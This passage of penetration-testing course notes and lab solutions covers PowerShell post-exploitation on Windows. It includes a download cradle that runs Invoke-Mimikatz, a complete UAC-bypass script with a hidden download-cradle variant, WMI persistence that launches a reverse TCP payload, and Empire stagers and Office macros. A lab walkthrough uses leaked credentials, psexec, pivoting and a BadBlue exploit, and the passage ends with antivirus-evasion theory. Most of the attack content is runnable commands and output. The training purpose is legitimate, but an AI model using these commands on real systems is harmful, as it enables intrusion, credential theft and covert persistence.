`powershell_execute 'iex (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1"); Invoke-Mimikatz'`

**Pass an existing active agent session from PowerShell-Empire over to Metasploit**.

`search web delivery`, `use exploit/multi/script/web_delivery`, `set PAYLOAD windows/meterpreter/reverse_https`, `shopw options`, `set SRVHOST <AttackerIP>`, `set LHOST <AttackerIP>`, `show targets`, `set TARGET PSH`, `exploit`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.11.2:4444
[*] Using URL: http://10.10.11.2:8080/Klji3v5GH ←
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBl ...
```

`usemodule powershell/code_execution/invoke_metasploitpayload`, `info`, `set URL http://10.10.11.2:8080/Klji3v5GH`, `set Agent Klji3v5GH`, `execute`.

`sessions -i 1`, `shell`, `powershell`.

### UAC Bypass with PowerShell Script - Theory/Lab

In the Windows environment, ensuring process integrity is vital for system security.
Processes are categorized into three integrity levels: Medium, High, and System, each representing different access privileges.

Privilege auto-elevation allows programs to escalate from Medium to High privileges automatically, often specified in the application manifest (checkable with some programs, e.g. "PEStudio"). While this can streamline operations, it also poses security risks, potentially exploited by malware.
Despite auto-elevation, some programs remain vulnerable to UAC bypass exploits, undermining User Account Control's security measures. These exploits leverage system vulnerabilities to execute code with elevated privileges, circumventing UAC protections. Vulnerabilities persist even in programs with privilege auto-elevation attributes.
To mitigate UAC bypass risks, maintaining system and application updates is crucial, alongside implementing robust cybersecurity practices like antivirus software, firewalls, and appropriate security settings.

Let's take a look at a known Windows program which contains the same auto-elevate property but it is also vulnerable to a UAC bypass exploit.
The UAC bypass exploit we will see requires that UAC is set to its default setting.

We've identified a program which auto-elevates as a high-integrity process (i.e. "Computer Management" `C:\Windows\System32\CompMgmtLauncher.exe`), which naturally bypass UAC in a sense. We've also identified that the program checks for registry keys and values (i.e. `HKCU:\Software\Classes\mscfile\shell\open\command`), which are writable by us, and which are responsible for associating file types of MSC extension to a specific application. We also hijacked that process to launch a command of our choosing (i.e. `C:\Windows\System32\calc.exe`).

Now, let's see a PowerShell script that once executed will run a command of our choosing (copy a file in a protected directory) as high-integrity and will bypass UAC.
```powershell
<#
UAC Bypass
#>

# Check UAC status
Write-Host "[+] Checking UAC status."
$ConsentPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).ConsentPromptBehaviorAdmin
$SecureDesktopPrompt = (Get-ItemProperty HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System).PromptOnSecureDesktop

if ($ConsentPrompt -eq 2 -and $SecureDesktopPrompt -eq 1) {
    Write-Host "[!] UAC is set to 'Always Notify', I can't help you."
    exit
}
else {
    Write-Host "[*] UAC Status OK and set to 'Default'."

    # Modify registry for UAC bypass
    $MscRegPath = "HKCU:\Software\Classes\mscfile\shell\open\command"
    $ValName = "(Default)"
    $RegValue = "cmd /c copy C:\users\localadmin\desktop\test.txt C:\windows\system32\test.txt"
    New-Item -Path $MscRegPath -Force | Out-Null
    New-ItemProperty -Path $MscRegPath -Name $ValName -Value $RegValue | Out-Null

    # Bypass UAC using CompMgmtLauncher.exe
    $CompMgmtBypass = "wmic process call create 'cmd.exe /c start /min C:\windows\system32\CompMgmtLauncher.exe'"
    $a_cmd = "C:\windows\system32\cmd.exe"
    &$a_cmd

    # Wait for some time
    Start-Sleep -Seconds 5

    # Cleanup registry modifications
    $MscRegCleanup = "HKCU:\Software\Classes\mscfile"
    Remove-Item -Path $MscRegCleanup -Force -Recurse -ErrorAction SilentlyContinue | Out-Null
}
```

Of course, we can modify the registry variable to something a bit more useful like a PowerShell download cradle, like the following.
```powershell
$RegValue = "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -ep Bypass -windowstyle hidden -nop iex (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/<PowerShellScript>'); Invoke-Function"
```

### Leveraging WMI for Persistence (with Get-WmiObject, Invoke-WmiMethod, PowerLurk) - Theory

**Windows Management Instrumentation** (WMI) is a system management technology in Windows operating systems that provides an interface for monitoring and controlling both hardware and software components of a system. WMI enables system administrators to access and manipulate system information using an object-based schema. This means that users can query system information such as hardware details, installed software, configuration settings, and more through WMI queries.

WMI is designed to be extensible and supports a wide range of system management capabilities. Developers can create scripts, applications, and management tools that utilize WMI to automate system management tasks and monitor system status in real-time.

Key features provided by WMI include:
- System Monitoring: Administrators can monitor system performance, resource consumption, system events, and more through WMI queries.
- System Configuration: WMI can be used to manage system configuration settings such as users, groups, services, network, and security.
- Process Automation: WMI enables the automation of system management tasks through scripts and applications that perform management operations remotely or locally.
- Event Detection: WMI allows for the detection of system events, system errors, and more, enabling system administrators to respond quickly to anomalous situations.

We can use PowerShell to interface with WMI, using the `Get-WmiObject` and `Invoke-WmiMethod` commandlets.

#### Get-WmiObject

`Get-WmiObject -Class Win32_Service`: to retrieve information about system services.
`Get-WmiObject -Class Win32_Service | Where-Object {$_.State -Match "Running"}`: to retrieve information about running services.
`Get-WmiObject -Class Win32_Service | Where-Object {$_.Name -Match "Defend"}`: to retrieve information about services with names containing "Defend".

`Get-WmiObject -List Win32_Process | Get-Member -MemberType Method`: to list methods available for managing processes.
`$proc = Get-WmiObject -List Win32_Process`, `$proc.Create("cmd.exe")`: to create a new process (e.g. "cmd.exe").

#### Invoke-WmiMethod

`Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList cmd.exe`: to start a new process (e.g. "cmd.exe").
`Invoke-WmiMethod -Class Win32_Process -Filter {ProcessId = "2512"}`: to invoke methods on a specific process by Process ID.
`Invoke-WmiMethod -Class Win32_Process -Filter {ProcessId = "2512"} | Remove-WmiObject`: to kill a specific process by Process ID.

#### PowerLurk

[**PowerLurk**](https://github.com/Sw4mpf0x/PowerLurk) is a tool to create persistence via malicious WMI Event Subscriptions.

### Leveraging WMI for Persistence (with PowerLurk) - Lab

#### Lab Solution

`msfvenom -p windows/x64/reverse_tcp LHOST=<AttackerIP> LPORT=<AttackerPort> -f exe -o /root/Desktop/reverse_tcp64.exe`, `file /root/Desktop/reverse_tcp64.exe`.
`wget -O /root/Desktop/PowerLurk.ps1 https://raw.githubusercontent.com/Sw4mpf0x/PowerLurk/master/PowerLurk.ps1`.
`cd /root/Desktop`, `python3 http.server 80`.

`msfconsole -q`, `search multi handler`, `use exploit/multi/handler`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp`, `show options`, `set LHOST <AttackerIP>`, `set LPORT <AttackerPort>`, `exploit -j`.

`IEX (New-Object Net.WebClient).DownloadFile('http://<AttackerIP>/reverse_tcp64.exe', 'C:\programdata\reverse_tcp64.exe')`: to download the reverse tcp payload via the PowerShell download cradle.

`IEX (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/PowerLurk.ps1'); Register-MaliciousWmiEvent -EventName CalcExec -PermanentCommand "cmd.exe /c C:\programdata\reverse_tcp64.exe" -Trigger ProcessStart -ProcessName calc.exe`: this trigger will generate our malicious WMI event (named `CalcExec`) every time the user launches the "calc.exe" program, executing the reverse tcp payload on the target machine.

`IEX (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/PowerLurk.ps1'); Get-Wmi Event -Name CalcExec`: to view the malicious WMI event just created.

`IEX (New-Object Net.WebClient).DownloadString('http://<AttackerIP>/PowerLurk.ps1'); Get-Wmi Event-Name CalcExec | Remove-WmiObject`: to remove the malicious WMI event just created.

### PowerShell-Empire for Persistence - Theory

**PowerShell-Empire** (alias Empire) is a pure PowerShell exploitation/post-exploitation framework built on cryptographically secure communications and flexible architecture. Empire enables the execution of PowerShell *stagers* without requiring powershell.exe, offers swiftly deployable post-exploitation modules ranging from keyloggers to Mimikatz, and employs adaptable communications to evade network detection, all encapsulated within a usability-focused framework.

PowerShell-Empire comprises several core components, including:
- *Server*. This central component of the framework manages communication with *stagers* (also referred to as implants or payloads) executed on target systems. The server can operate on a central control machine and utilizes *listeners* to accept incoming connections from stagers.
- *Stager*. Stagers are small PowerShell scripts executed on target systems. Once executed, stagers connect to the PowerShell Empire *server* to receive instructions and transmit information. Stagers can run on compromised Windows computers or on any system capable of executing PowerShell scripts.

Here's a general overview of the process:
1. Setup. Initially, the PowerShell Empire server needs configuration. This involves configuring listeners (IP, port, launcher string, encryption key, etc.) to specify how the server will accept incoming connections and potentially customizing modules and payloads.
2. *Stager Creation*. Subsequently, a payload or stager is created to execute on target systems. This can be accomplished using one of the numerous available modules in PowerShell Empire or customizing a payload to suit specific requirements.
3. *Stager Deployment*. Once the stager is created, it must be deployed on target systems. This can be achieved through various techniques such as social engineering, remote code injection, or exploiting vulnerabilities.
4. *Stager Connection*. After execution on target systems, the stager establishes a connection to the PowerShell Empire server. This enables the attacker to issue commands and receive information from the agent.
5. *Command Execution*. Upon establishing a connection with the stager, a wide range of commands can be executed to perform tasks such as gathering information, escalating privileges, and maintaining persistence.

In addition to being updated and modernized, the company responsible for maintaining PowerShell-Empire has also developed **Starkiller**, that is a GUI frontend for Empire. It is an Electron application written in VueJS and provides users with an intuitive way of interacting with Empire.

To install and set up PowerShell-Empire:
`sudo apt install powershell-empire starkiller -y`,
`sudo powershell-empire server`, `sudo powershell-empire client`.

### PowerShell-Empire for Persistence - Lab

#### Lab Solution

**Set up and run the PowerShell-Empire framework**.

`cd /root/tools`, `git clone https://github.com/BC-SECURITY/Empire.git`, `cd Empire`, `cd setup`, `./install.sh`.

`./ps-empire server`, `./ps-empire client`.

`cd /root/tools/Empire/setup`, `./cert.sh`:
```
[*] Certificate written to ../data/empire-chain.pem
[*] Private key written to ../data/empire-priv.key
```

`help`, `uselistener http`, `info`, `set CertPath /root/tools/Empire/data`, `execute`, `back`, `listeners`:
```
┌Listeners List──────┬───────────────────┬──────────────────────────────────────────┬─────────┐
│ ID │ Name │ Module │ Listener Category │ Created At                               │ Enabled │
├────┼──────┼────────┼───────────────────┼──────────────────────────────────────────┼─────────┤
│ 1  │ http │ http   │ client_server     │ 2024-04-03 12:59:54 IST (24 seconds ago) │ True    │
└────┴──────┴────────┴───────────────────┴──────────────────────────────────────────┴─────────┘
```

`usestager multi/launcher`, `info`, `set Listener http`, `execute`:
```
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAG ...
```

`powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAG ...`.

`agents`:
```
┌Agents──────────┬────────────┬─────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐
│ ID │ Name      │ Language   │ Internal IP │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener │
├────┼───────────┼────────────┼─────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤
│ 1  │ 2X18ML3W* │ powershell │ 10.2.31.174 │ WORKGROUP\SYSTEM │ powershell │ 2256 │ 5/0.0 │ 2024-04-03 13:03:09 IST │ http     │
│    │           │            │             │                  │            │      │       │ (3 seconds ago)         │          │
└────┴───────────┴────────────┴─────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘
```

`interact 2X18ML3W`, `help`, `shell whoami`:
```
desktop/user
```

`searchmodule checks`, `usemodule powershell/situational_awareness/host/computerdetails`, `execute`:
```
LogonType             : 3
NewLogonAccountName   : Administrator
SourcePort            : 41323
SourceNetworkAddress  : 10.10.11.2
Times                 : {4/3/2024 7:16:24 AM}
LogSource             : Security
SourceAccountName     : -
WorkstationName       : WORKSTATION
Count                 : 1
SourceDomainName      : -
NewLogonAccountDomain : ATTACKDEFENSE
LogType               : 4624

LogonType             : 3
NewLogonAccountName   : Administrator
SourcePort            : -
SourceNetworkAddress  : -
Times                 : {1/12/2022 11:29:12 AM}
LogSource             : Security
SourceAccountName     : -
WorkstationName       : attackdefense
Count                 : 1
SourceDomainName      : -
NewLogonAccountDomain : ATTACKDEFENSE
LogType               : 4624

LogonType             : 10
NewLogonAccountName   : Administrator
SourcePort            : 0
SourceNetworkAddress  : 172.104.52.153
Times                 : {1/12/2022 11:29:13 AM}
LogSource             : Security
SourceAccountName     : ATTACKDEFENSE$
WorkstationName       : ATTACKDEFENSE
Count                 : 1
SourceDomainName      : WORKGROUP
NewLogonAccountDomain : ATTACKDEFENSE
LogType               : 4624


Event ID 4648 (Explicit Credential Logon):

Times             : {1/12/2022 11:29:13 AM}
TargetAccountName : Administrator
LogSource         : Security
SourceAccountName : ATTACKDEFENSE$
TargetServer      : localhost
Count             : 1
SourceDomainName  : WORKGROUP
TargetDomainName  : ATTACKDEFENSE
LogType           : 4648
```

**Generate a MS Office macro to perform a client-side attack**.

`main`, `usestager windows/macro`, `info`, `set Listener http`, `set OutFile /root/Desktop/ms_macro`, `execute`.

`cat /root/Desktop/macro`.

### Windows Black-Box Penetration Test (with Nmap, Metasploit, PowerShell-Empire, proxychains) - Lab

#### Lab Environment

You have been tasked by an organization to conduct a penetration test. Suppose that the organization's internet-facing machine is accessible at `demo.ine.local`. There is another machine (`fileserver.ine.local`) which is not directly accessible.

Task: Perform remote exploitation and post-exploitation tasks on vulnerable systems, gain access to both machines and retrieve the flag!

Learning Objectives:
- Identify vulnerabilities from a remote exploitation perspective.
- Exploit discovered vulnerabilities.
- Obtain access to machines (that are not directly accessible).
- Use PowerShell and related tools for tasks where applicable.

Recommended tools:
- PowerShell-Empire
- Nmap
- Metasploit

#### Lab Solution

**Step 1: Network Discovery**.

`ping -c 3 demo.ine.local`:
```
PING demo.ine.local (10.2.26.239) 56(84) bytes of data.
64 bytes from demo.ine.local (10.2.26.239): icmp_seq=1 ttl=125 time=3.71 ms
64 bytes from demo.ine.local (10.2.26.239): icmp_seq=2 ttl=125 time=2.61 ms
64 bytes from demo.ine.local (10.2.26.239): icmp_seq=3 ttl=125 time=2.57 ms

--- demo.ine.local ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms ←
rtt min/avg/max/mdev = 2.572/2.964/3.711/0.528 ms
```

`ping -c 3 fileserver.ine.local`:
```
PING fileServer.ine.local (10.2.26.191) 56(84) bytes of data.

--- fileServer.ine.local ping statistics ---
3 packets transmitted, 0 received, 100% packet loss, time 2033ms ←
```

`ip addr | grep 'inet'`:
```
    inet 127.0.0.1/8 scope host lo
    inet 10.1.0.7/16 brd 10.1.255.255 scope global eth0
    inet 10.10.11.2/24 brd 10.10.11.255 scope global eth1 ←
```

**Step 2: Port Scanning and Service Enumeration**.

`nmap -sS -sV demo.ine.local`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-02 15:12 IST
Nmap scan report for demo.ine.local (10.2.26.239)
Host is up (0.0027s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds ←
3389/tcp  open  ssl/ms-wbt-server?
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49160/tcp open  msrpc              Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.84 seconds
```

`nmap -sS demo.ine.local -p-`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-02 16:02 IST
Nmap scan report for demo.ine.local (10.2.30.84)
Host is up (0.0048s latency).
Not shown: 65521 closed tcp ports (reset)
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
4983/tcp  open  unknown ←
5985/tcp  open  wsman
47001/tcp open  winrm
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49175/tcp open  unknown
49176/tcp open  unknown
49177/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.91 seconds
```

`nmap -sS -sV demo.ine.local -p4983`:
```
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-02 17:27 IST
Nmap scan report for demo.ine.local (10.2.16.107)
Host is up (0.0029s latency).

PORT     STATE SERVICE VERSION
4983/tcp open  http    Apache httpd 2.4.52 ((Win64)) ←

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.68 seconds
```

`curl demo.ine.local:4983`:
```
@echo off net use "\\fileserver\C$" /user:Administrator abc_123321!@# if exist ←
"\\fileserver\C$\Program_Files\MSBuild\ErrorLog.txt" ( echo "Copying errors\..." copy "\\fileserver\C$\Program_Files\MSBuild\ErrorLog.txt" C:\Users\local_admin\Logs\Host1\ del "\\fileserver\C$\Program_Files\MSBuild\ErrorLog.txt" ) else ( echo "No errors!" ) net use "\\fileserver\C$" /delete 
```

**Step 3: Exploiting SMB with Metasploit**.

`msfconsole -q`, `search psexec`, `use exploit/windows/smb/psexec`, `show payloads`, `set PAYLOAD windows/x64/meterpreter/reverse_tcp `, `show options`, `set RHOSTS demo.ine.local`, `set SMBUser Administrator`, `set SMBPass abc_123321!@#`, `exploit`.

`sysinfo`:
```
Computer        : ATTACKDEFENSE
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x64/windows
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM
```

`ps -s svchost.exe`:
```
Filtering on SYSTEM processes...
Filtering on 'svchost.exe'

Process List
============

 PID   PPID  Name         Arch  Session  User                 Path
 ---   ----  ----         ----  -------  ----                 ----
 756   688   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\system32\svchost.exe ←
 916   688   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\system32\svchost.exe
 1292  688   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1356  688   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
```

`migrate 756`:
```
[*] Migrating from 2744 to 756...
[*] Migration completed successfully.
```

**Step 4: Post-Exploitation Network Configuration**.

`shell`, `ipconfig`:
```
Windows IP Configuration

Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : eu-central-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::f4c7:ea68:f70c:5621%12
   IPv4 Address. . . . . . . . . . . : 10.2.31.174 ←
   Subnet Mask . . . . . . . . . . . : 255.255.240.0 ←
   Default Gateway . . . . . . . . . : 10.2.16.1

Tunnel adapter isatap.eu-central-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : eu-central-1.compute.internal
```

`ping -n 3 10.2.21.72`:
```
Pinging 10.2.21.72 with 32 bytes of data:
Reply from 10.2.21.72: bytes=32 time<1ms TTL=128
Reply from 10.2.21.72: bytes=32 time<1ms TTL=128
Reply from 10.2.21.72: bytes=32 time<1ms TTL=128

Ping statistics for 10.2.21.72:
    Packets: Sent = 3, Received = 3, Lost = 0 (0% loss), ←
Approximate round trip times in milli-seconds:
    Minimum = 0ms, Maximum = 0ms, Average = 0ms
```

**Step 5: Establishing Persistent Access with PowerShell-Empire**.

`powershell-empire server`.

`powershell-empire client`, `uselistener http`, `set Host 10.10.11.2`, `set Port 8888`, `execute`, `listeners`:
```
┌Listeners List──────┬───────────────────┬──────────────────────────────────────────┬─────────┐
│ ID │ Name │ Module │ Listener Category │ Created At                               │ Enabled │
├────┼──────┼────────┼───────────────────┼──────────────────────────────────────────┼─────────┤
│ 1  │ http │ http   │ client_server     │ 2024-04-03 12:59:54 IST (24 seconds ago) │ True    │
└────┴──────┴────────┴───────────────────┴──────────────────────────────────────────┴─────────┘
```

`main`, `usestager multi/handler`, `set Listener http`, `execute`:
```
powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAG ...
```

`sessions -i 1`, `shell`, `powershell -noP -sta -w 1 -enc  SQBmACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAG ...`.

`agents`:
```
┌Agents──────────┬────────────┬─────────────┬──────────────────┬────────────┬──────┬───────┬─────────────────────────┬──────────┐
│ ID │ Name      │ Language   │ Internal IP │ Username         │ Process    │ PID  │ Delay │ Last Seen               │ Listener │
├────┼───────────┼────────────┼─────────────┼──────────────────┼────────────┼──────┼───────┼─────────────────────────┼──────────┤
│ 1  │ 2X18ML3W* │ powershell │ 10.2.31.174 │ WORKGROUP\SYSTEM │ powershell │ 2256 │ 5/0.0 │ 2024-04-03 13:03:09 IST │ http     │
│    │           │            │             │                  │            │      │       │ (3 seconds ago)         │          │
└────┴───────────┴────────────┴─────────────┴──────────────────┴────────────┴──────┴───────┴─────────────────────────┴──────────┘
```

`interact 2X18ML3W`, `usemodule powershell/situational_awareness/host/computerdetails`, `execute`:
```
LogonType             : 3
NewLogonAccountName   : Administrator
SourcePort            : 41323
SourceNetworkAddress  : 10.10.11.2
Times                 : {4/3/2024 7:16:24 AM}
LogSource             : Security
SourceAccountName     : -
WorkstationName       : WORKSTATION
Count                 : 1
SourceDomainName      : -
NewLogonAccountDomain : ATTACKDEFENSE
LogType               : 4624

LogonType             : 3
NewLogonAccountName   : Administrator
SourcePort            : -
SourceNetworkAddress  : -
Times                 : {1/12/2022 11:29:12 AM}
LogSource             : Security
SourceAccountName     : -
WorkstationName       : attackdefense
Count                 : 1
SourceDomainName      : -
NewLogonAccountDomain : ATTACKDEFENSE
LogType               : 4624

LogonType             : 10
NewLogonAccountName   : Administrator
SourcePort            : 0
SourceNetworkAddress  : 172.104.52.153
Times                 : {1/12/2022 11:29:13 AM}
LogSource             : Security
SourceAccountName     : ATTACKDEFENSE$
WorkstationName       : ATTACKDEFENSE
Count                 : 1
SourceDomainName      : WORKGROUP
NewLogonAccountDomain : ATTACKDEFENSE
LogType               : 4624


Event ID 4648 (Explicit Credential Logon):

Times             : {1/12/2022 11:29:13 AM}
TargetAccountName : Administrator
LogSource         : Security
SourceAccountName : ATTACKDEFENSE$
TargetServer      : localhost
Count             : 1
SourceDomainName  : WORKGROUP
TargetDomainName  : ATTACKDEFENSE
LogType           : 4648
```

`usemodule powershell/situational_awareness/network/portscan`, `set Hosts 10.2.21.72`, `execute`:
```
Hostname   OpenPorts          
--------   ---------          
10.2.21.72 80,3389,445,139,135 ←
```

**Step 6: Deploying Additional Payloads via Web Delivery**.

`sessions`, `sessions -k 1`.

`search web delivery`, `use exploit/multi/script/web_delivery`, `show targets`, `set TARGET PSH`, `show options`, `set SRVHOST 10.10.11.2`, `set LHOST 10.10.11.2`, `set PAYLOAD windows/meterpreter/reverse_tcp`, `exploit`:
```
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.11.2:4444
[*] Using URL: http://10.10.11.2:8080/Klji3v5GH ←
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBl ...
```

`usemodule powershell/code_execution/invoke_metasploitpayload`, `info`, `set URL http://10.10.11.2:8080/Klji3v5GH`, `execute`.

**Step 7: Gaining Elevated Access and Exploring Processes**.

`sessions`, `sessions -i 2`, `sysinfo`:
```
Computer        : ATTACKDEFENSE
OS              : Windows 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM
```

`ps -s svchost.exe`:
```
Filtering on SYSTEM processes...
Filtering on 'svchost.exe'

Process List
============

 PID   PPID  Name         Arch  Session  User                 Path
 ---   ----  ----         ----  -------  ----                 ----
 752   680   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe ←
 924   680   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1296  680   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
 1348  680   svchost.exe  x64   0        NT AUTHORITY\SYSTEM  C:\Windows\System32\svchost.exe
```

`migrate 752`:
```
[*] Migrating from 836 to 752...
[*] Migration completed successfully.
```

**Step 8: Network Pivoting and Internal Reconnaissance**.

`bg`, `search autoroute`, `use post/multi/manage/autoroute`, `show options`, `set SESSION 2`, `run`:
```
[!] SESSION may not be compatible with this module:
[!]  * incompatible session platform: windows
[*] Running module against ATTACKDEFENSE
[*] Searching for subnets to autoroute.
[+] Route added to subnet 10.2.16.0/255.255.240.0 from host's routing table. ←
[*] Post module execution completed
```

`proxychains --version`:
```
[proxychains] config file found: /etc/proxychains4.conf ←
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
proxychains can't load process....: No such file or directory
```

`cat /etc/proxychains4.conf | grep -i socks`:
```
#        HTTP, SOCKS4a, SOCKS5 tunneling proxifier with DNS.
#               socks5  192.168.67.78   1080    lamer   secret
#               socks4  192.168.1.49    1080
#       proxy types: http, socks4, socks5, raw
#        ( auth types supported: "basic"-http  "user/pass"-socks )
socks4  127.0.0.1 9050 ←
```

`search socks`, `use auxiliary/server/socks_proxy`, `show options`, `set VERSION 4a`, `set SRVPORT 9050`, `run`, `jobs`.

`proxychains nmap -sS -Pn 10.2.27.57 -p1-1000`:
```
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-02 17:58 IST
Nmap scan report for fileServer.ine.local (10.2.27.57)
Host is up.
All 1000 scanned ports on fileServer.ine.local (10.2.27.57) are in ignored states.
Not shown: 1000 filtered tcp ports (no-response) ←

Nmap done: 1 IP address (1 host up) scanned in 121.20 seconds
```

`proxychains nmap -sT -Pn 10.2.27.57 -p1-1000`:
```
[proxychains] DLL init: proxychains-ng 4.15
Starting Nmap 7.92 ( https://nmap.org ) at 2024-04-02 17:58 IST
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.27.57:139  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.27.57:53 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.27.57:554 <--denied
[proxychains] Strict chain  ...  127.0.0.1:9050  ...  10.2.27.57:143 <--denied

...

Nmap scan report for fileServer.ine.local (10.2.27.57)
Host is up (1.1s latency).
Not shown: 996 closed tcp ports (conn-refused)
PORT    STATE SERVICE
80/tcp  open  http ←
135/tcp open  msrpc
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 1056.15 seconds
```

`proxychains nmap -sT -sV -Pn 10.2.27.57 -p80`:
```
Nmap scan report for fileServer.ine.local (10.2.27.57)
Host is up (0.069s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    BadBlue httpd 2.7 ←
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.63 seconds
```

**Step 9: Exploiting Vulnerabilities to Access Internal Systems**.

`search badblue 2.7`, `use exploit/windows/http/badblue_passthru`, `show options`, `set RHOSTS fileserver.ine.local`, `set PAYLOAD windows/meterpreter/bind_tcp`, `exploit`.

`sysinfo`:
```
Computer        : ATTACKDEFENSE
OS              : Windows 2016+ (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 1
Meterpreter     : x86/windows
```

`getuid`:
```
Server username: NT AUTHORITY\SYSTEM
```

---

## Antivirus Evasion

### Antivirus Evasion (with Shellter) - Theory

**Defense Evasion** consists of techniques that adversaries use to avoid detection throughout their compromise. Techniques used for defense evasion include uninstalling/disabling security software or *obfuscating/encrypting* data and scripts. Adversaries also leverage and abuse *trusted processes* to hide and masquerade their malware.

**AV Detection Methods**:
- *Signature* based detection. An AV signature is a unique sequence of bytes that uniquely identifies malware. As a result, you will have to ensure that your obfuscated exploit or payload doesn't match any known signature in the AV database. 
- We can bypass signature-based detection by modifying the malware's byte sequence, therefore changing the signature.
- *Heuristic* based detection. Relies on rules or decisions to determine whether a binary is malicious. It also looks for specific patterns within the code or program calls.
- *Behavior* based detection. Relies on identifying malware by monitoring it's behavior (used for newer strains of malware).

1. **On-disk AV Evasion Techniques**:
	- *Obfuscation*. Obfuscation refers to the process of concealing something important, valuable, or critical. Obfuscation reorganizes code in order to make it harder to analyze or RE.
	- *Encoding*. Encoding data is a process involving changing data into a new format using a scheme. Encoding is a reversible process; data can be encoded to a new format and decoded to its original format.
	- *Packing*. Generate executable with new binary structure with a smaller size and therefore provides the payload with a new signature.
	- *Crypters*. Encrypts code or payloads and decrypts the encrypted code in memory. The decryption key/function is usually stored in a stub.

2. **In-Memory AV Evasion Techniques**:
	- *Memory Manipulation*. Injects payload into a process by leveraging various Windows APIs and does not write files to disk. Payload is then executed in memory in a separate thread.

#### Shellter

[**Shellter**](https://www.shellterproject.com/homepage/introducing-shellter/) is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created.
It can be used in order to inject shellcode into native Windows applications (currently 32-bit applications only).
